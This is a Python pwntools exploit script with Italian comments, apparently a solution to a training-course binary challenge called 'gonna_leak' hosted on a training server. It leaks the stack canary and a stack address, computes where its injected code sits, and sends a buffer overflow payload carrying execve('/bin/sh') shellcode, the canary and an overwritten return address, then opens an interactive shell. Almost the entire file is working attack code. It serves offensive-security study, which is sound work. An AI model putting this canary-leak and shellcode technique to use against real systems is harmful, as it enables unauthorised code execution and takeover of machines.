'''
Non c'è un global buffer quindi devo saltare su un indirizzo dello stack.
'''
from pwn import *
import time

# 0x401224 è l'indirizzo della print
# 0x004011d4 è l'indirizzo della read
context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./gonna_leak")
    gdb.attach(r, """
            #b *0x4011d4
            b *0x401224
            #b *0x0040122b
            #b *0x004011d4
            c
                  """)
    input("wait")
else:
    r = remote("bin.training.offdef.it", 2011)


context.arch = 'amd64'
stringa = b"/bin/sh"

print("1:", r.recv())
r.send(b"B"*105)
r.recvuntil(b"> ")
r.read(105)
leaked_canary = b"\x00" + r.read(7)
canary = u64(leaked_canary)
print("[!] leaked_canary %#x" % canary)

r.send(b"A"*152)
r.recvuntil(b"> ")
r.read(152)
leaked_address = r.read(6) + b"\x00\x00"
addr = u64(leaked_address)
print("leaked add %#x" %addr)

buffer_in_locale = 0x7ffea20391d0 # preso da gdb in locale
indirizzo_leakato_in_locale = 0x7ffea2039358 # è l'indirizzo leakeato riferito all'esecuzione con il buffer in locale sopra
# perchè a ogni esecuzione gli indirizzi cambiano ma questo offset è sempre lo stesso quindi mi basta calcolare questa differenza
# una volta sola e poi posso usarla per tutte le esecuzioni

programOffset = int(buffer_in_locale) - int(indirizzo_leakato_in_locale) 
print("Program offset: " + hex(programOffset))
'''
In pratica ho un'equazione:
Buffer1-leak1=buffer2-leak2, buffer1 e leak1 li ho, la differenza è quello che ho chiamato offset. Quindi
offset = buffer2-leak2.
Però Leak 2 ce l'ho facendo il leak e quindi devo trovare buffer2 (wheretojump) e per farlo devo fare 
buffer2 = leak2 + offset
'''
whereToJump = int(addr) + programOffset +1 # +1 serve a compensare l'ultimo /n che inviamo per uscire che sovrascrive il primo byte della
# prima istruzione dello shellcode
wtj = whereToJump.to_bytes(8, byteorder='little') #per portarlo in little endian
print("Where to jump: " + hex(whereToJump))
asm_code = """
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
movabs rdi, """ + hex(whereToJump) + """
add rdi, 0x1c
syscall
"""
# sopra ho messo 0x1c invece di 0x1d (cioè 28 al posto di 29) perchè non si sa!! Forse c'è un problema di allineamento
input("wait")
shellcode = asm(asm_code)
shellcode = shellcode + stringa + b"\x00"
payload = shellcode + b"A"* (104-len(shellcode)) + leaked_canary + b"B"*8 + wtj

r.send(payload)

time.sleep(0.1)
 
r.sendline(b"") # viene utilizzata per inviare una stringa di byte vuota seguita da un carattere di nuova linea (\n) 

r.interactive()

# Per contare l'offset faccio la differenza tra l'indirizzo dello stack che vorrei leakare e l'inizio del buffer in cui 
# avevo messo le B e questa differenza fa 47. Poi faccio 47 + 105 (lunghezza delle B/del buffer) e ottengo 152.
# Perchè a ogni send il buffer si azzera
# Poi faccio la read di 152 bytes e poi arrivo a leggerne i seguenti 8 che conterranno 
# Poi per capire dove saltare facciamo la differenza tra l'indirizzo trovato e l'indirizzo del mio buffer (che vedo con gdb in buf della read)
# NB: ricordarsi il little endian